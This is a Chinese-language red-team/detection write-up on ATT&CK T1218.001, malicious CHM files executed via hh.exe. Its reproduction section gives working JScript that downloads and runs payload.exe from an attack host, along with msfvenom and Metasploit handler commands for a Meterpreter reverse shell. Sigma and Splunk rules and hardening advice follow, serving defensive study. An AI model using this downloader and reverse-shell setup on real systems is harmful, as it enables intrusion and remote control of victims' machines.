# T1218.001-使用编译的HTML文件执行Payload（白名单绕过）

## 描述

攻击者可利用编译的HTML帮助文件（.chm）隐藏和执行恶意代码。CHM文件是Microsoft HTML帮助系统的一部分，包含HTML文档、图像和脚本（如VBA、JScript、ActiveX）。这些文件通过`hh.exe`（HTML帮助可执行程序，位于`C:\Windows\hh.exe`）加载，依赖Internet Explorer的底层组件渲染内容。

攻击者可创建包含恶意脚本的自定义CHM文件，通过网络钓鱼或多阶段恶意软件分发，诱导用户执行。恶意CHM文件可能触发VBA、JScript或ActiveX代码，执行Payload。在未打补丁或老旧系统（如Windows XP）上，`hh.exe`执行CHM文件可能绕过应用程序白名单（如AppLocker），因为`hh.exe`是Microsoft签名的合法工具。此外，CHM文件的脚本执行可能规避防病毒检测。

## 测试案例

### 案例说明
CHM文件支持HTML内容和脚本语言（如VBA、JScript），通过`hh.exe`打开。攻击者可嵌入恶意脚本（如反弹Shell）在CHM文件中，诱导用户双击或通过命令行执行。以下是一个简单的测试案例：

**创建恶意CHM文件**：
1. 使用HTML帮助工作坊（HTML Help Workshop）创建CHM文件。
2. 嵌入JScript代码，执行计算器作为测试：
   ```html
   <html>
   <head>
   <script language="JScript">
   function malicious() {
       var shell = new ActiveXObject("WScript.Shell");
       shell.Run("calc.exe");
   }
   </script>
   </head>
   <body onload="malicious()">
   <h1>Test CHM</h1>
   </body>
   </html>
   ```
3. 编译为`test.chm`，保存到`C:\Users\<username>\Desktop\test.chm`。
4. 执行：`hh.exe C:\Users\<username>\Desktop\test.chm`。

### 补充说明
- 日志监控：
  - 在高版本Windows系统（如Windows 7及以上），可通过组策略启用进程命令行参数记录：
    - 路径：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`
  - 部署Sysmon并配置规则，记录进程创建和脚本执行。
- 局限性：
  - 默认Windows日志可能不记录脚本执行细节，需启用审核策略或Sysmon。
  - 合法CHM文件（如帮助文档）可能触发类似日志，需结合文件路径和内容分析。

## 检测日志

### 数据来源
- Windows安全日志：
  - 事件ID 4688：进程创建，记录`hh.exe`的执行信息。
- Sysmon日志：
  - 事件ID 1：进程创建，包含命令行、哈希值和父进程。
  - 事件ID 7：映像加载，记录加载的DLL（如`mshtml.dll`）。
  - 事件ID 10：进程访问，可能涉及`hh.exe`调用子进程。
- 文件监控：
  - 检测非系统路径下的CHM文件。
- 网络监控：
  - 检测`hh.exe`引发的异常网络连接（如反弹Shell）。

### 日志示例
- 事件ID 4688示例：
  ```
  进程信息:
    新进程名称:C:\Windows\hh.exe
    命令行:hh.exe C:\Users\zhuli\Desktop\TevoraAutomatedRTGui\atomic-red-team-master\atomics\T1218.001\src\T1218.001.chm
    创建者进程名称:C:\Windows\System32\cmd.exe
  ```
- Sysmon事件ID 1示例：
  ```
  事件ID:1
  OriginalFileName:HH.exe
  CommandLine:hh.exe C:\Users\zhuli\Desktop\TevoraAutomatedRTGui\atomic-red-team-master\atomics\T1218.001\src\T1218.001.chm
  CurrentDirectory:C:\Users\zhuli\
  User:QAX\zhuli
  Hashes:SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020
  ParentImage:C:\Windows\System32\cmd.exe
  ```

## 测试复现

### 环境准备
- 攻击机：Kali Linux 2019（或其他支持Metasploit的系统）
- 靶机：Windows 7（或其他支持CHM的Windows系统）
- 工具：
  - Metasploit Framework（生成Payload和监听）
  - HTML Help Workshop（创建CHM文件）
  - Sysmon（可选，日志收集）

### 攻击分析

#### 1.创建恶意CHM文件
1. **生成JScript Payload**：
   ```javascript
   <html>
   <head>
   <script language="JScript">
   function malicious() {
       var shell = new ActiveXObject("WScript.Shell");
       var client = new ActiveXObject("MSXML2.XMLHTTP");
       client.open("GET", "http://192.168.126.146:4444/payload", false);
       client.send();
       if (client.status == 200) {
           var stream = new ActiveXObject("ADODB.Stream");
           stream.Type = 1;
           stream.Open();
           stream.Write(client.responseBody);
           stream.SaveToFile("C:\\Temp\\payload.exe", 2);
           stream.Close();
           shell.Run("C:\\Temp\\payload.exe");
       }
   }
   </script>
   </head>
   <body onload="malicious()">
   <h1>Malicious CHM</h1>
   </body>
   </html>
   ```
   - 保存为`malicious.html`。
   - 使用HTML Help Workshop编译为`T1218.001.chm`。

2. **托管Payload**：
   在攻击机上托管`payload.exe`（如通过HTTP服务器）：
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f exe -o payload.exe
   python3 -m http.server 4444
   ```

3. **配置攻击机监听**：
   ```bash
   msf5>use exploit/multi/handler
   msf5 exploit(multi/handler)>set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler)>set LHOST 192.168.126.146
   msf5 exploit(multi/handler)>set LPORT 4444
   msf5 exploit(multi/handler)>set AutoRunScript migrate -f
   msf5 exploit(multi/handler)>exploit
   ```

4. **靶机执行Payload**：
   将`T1218.001.chm`传输到靶机（如`C:\Users\zhuli\Desktop\`），执行：
   ```cmd
   hh.exe C:\Users\zhuli\Desktop\T1218.001.chm
   ```
   或双击`T1218.001.chm`。

5. **结果分析**：
   - CHM文件加载时，JScript下载并执行`payload.exe`，触发反弹Shell。
   - 若未获得会话，检查：
     - 防火墙是否阻止HTTP请求或TCP连接。
     - CHM文件中的脚本是否被IE安全设置阻止。
     - 系统是否启用了ActiveX限制。

## 测试留痕

### Windows安全日志
- 事件ID 4688：
  ```
  进程信息:
    新进程名称:C:\Windows\hh.exe
    命令行:hh.exe C:\Users\zhuli\Desktop\T1218.001.chm
    创建者进程名称:C:\Windows\System32\cmd.exe
  ```

### Sysmon日志
- 事件ID 1：
  ```
  事件ID:1
  OriginalFileName:HH.exe
  CommandLine:hh.exe C:\Users\zhuli\Desktop\T1218.001.chm
  CurrentDirectory:C:\Users\zhuli\
  User:QAX\zhuli
  Hashes:SHA1=4B1E2F8EFBECB677080DBB26876311D9E06C5020
  ParentImage:C:\Windows\System32\cmd.exe
  ```
- 事件ID 7：记录加载的DLL（如`mshtml.dll`）。
- 事件ID 10：记录`hh.exe`调用子进程（如`payload.exe`）。
- 网络连接：可能记录HTTP请求或TCP连接到`192.168.126.146:4444`。

### 文件痕迹
- CHM文件存储在用户指定路径（如`C:\Users\zhuli\Desktop\T1218.001.chm`）。
- 下载的Payload存储在指定路径（如`C:\Temp\payload.exe`）。

## 检测规则/思路

### 检测方法
1. 进程监控：
   - 检测`hh.exe`加载非系统路径的CHM文件。
   - 检查`hh.exe`触发的子进程（如`cmd.exe`、`payload.exe`）。
2. 命令行分析：
   - 使用正则表达式匹配：
     ```regex
     hh\.exe.*\.chm
     ```
3. 文件监控：
   - 检测非标准路径下的CHM文件，结合静态分析检查脚本。
4. 网络监控：
   - 检测`hh.exe`发起的异常网络连接（如HTTP下载或反弹Shell）。
5. 行为分析：
   - 检测`hh.exe`加载`mshtml.dll`后执行ActiveX或JScript。
   - 监控由CHM文件触发的子进程。

### Sigma规则
优化后的Sigma规则，增强误报过滤：
```yaml
title:可疑CHM文件执行
id:9c4d7e2a-3f8b-4a5c-9e7d-6f8e9c0a1b2d
description:检测hh.exe加载可疑CHM文件，可能用于执行恶意脚本
status:experimental
logsource:
  category:process_creation
  product:windows
detection:
  selection:
    Image|endswith:'\hh.exe'
    CommandLine|contains:'.chm'
  filter_legitimate:
    CommandLine|contains:
      - 'C:\Program Files\'
      - 'C:\Program Files (x86)\'
  condition:selection and not filter_legitimate
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - 合法的CHM帮助文件（如软件文档）
level:high
tags:
  - attack.execution
  - attack.t1218.001
```

规则说明：
- 目标：检测`hh.exe`加载非系统路径CHM文件的执行。
- 过滤：排除加载程序安装目录（如`C:\Program Files`）中CHM文件的合法操作。
- 日志来源：Windows事件ID 4688（需启用命令行审核）或Sysmon事件ID 1。
- 误报处理：合法帮助文档可能触发，需结合文件路径和网络行为分析。
- 级别：标记为“高”优先级，因CHM文件执行脚本通常与恶意活动相关。

### Splunk规则
```spl
index=windows source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
(EventCode=1 Image="*\hh.exe" CommandLine="*.chm*")
OR (EventCode=10 SourceImage="*\hh.exe" TargetImage IN ("*\cmd.exe","*\powershell.exe","*\wscript.exe"))
| fields Image,CommandLine,ParentImage,User,TargetImage
```

规则说明：
- 检测`hh.exe`加载CHM文件（事件ID 1）和触发的子进程（事件ID 10）。
- 减少误报：结合子进程和文件路径分析。

### 检测挑战
- 误报：合法CHM帮助文件可能触发，需结合文件内容和网络行为分析。
- 日志依赖：脚本执行细节可能不记录，需部署Sysmon或增强日志策略。

## 防御建议
1. 监控和日志：
   - 启用命令行审核策略，确保事件ID 4688记录完整参数。
   - 部署Sysmon，配置针对`hh.exe`的规则，监控进程创建和子进程。
2. 网络隔离：
   - 限制非必要主机的出站连接，尤其是HTTP请求和高危端口（如4444）。
3. 文件审查：
   - 定期扫描非系统路径下的CHM文件，检查嵌入的脚本。
4. 权限控制：
   - 限制普通用户执行`hh.exe`或打开不受信任的CHM文件。
5. 安全更新：
   - 保持Windows系统和Internet Explorer更新，修复CHM执行相关漏洞。
6. ActiveX限制：
   - 配置IE安全设置，禁用未签名的ActiveX控件。

## 参考推荐
- MITRE ATT&CK T1218.001:  
  <https://attack.mitre.org/techniques/T1218/001/>
- 跟着ATT&CK学安全之defense-evasion:  
  <https://snappyjack.github.io/articles/2020-01/%E8%B7%9F%E7%9D%80ATT&CK%E5%AD%A6%E5%AE%89%E5%85%A8%E4%B9%8Bdefense-evasion>
- Sysmon配置与检测:  
  <https://github.com/SwiftOnSecurity/sysmon-config>
- Metasploit Framework: 用于生成和测试反弹Shell。  
  <https://www.metasploit.com/>
- Sysmon: Microsoft提供的系统监控工具。  
  <https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>
- HTML Help Workshop: 用于创建CHM文件。  
  <https://docs.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-downloads>
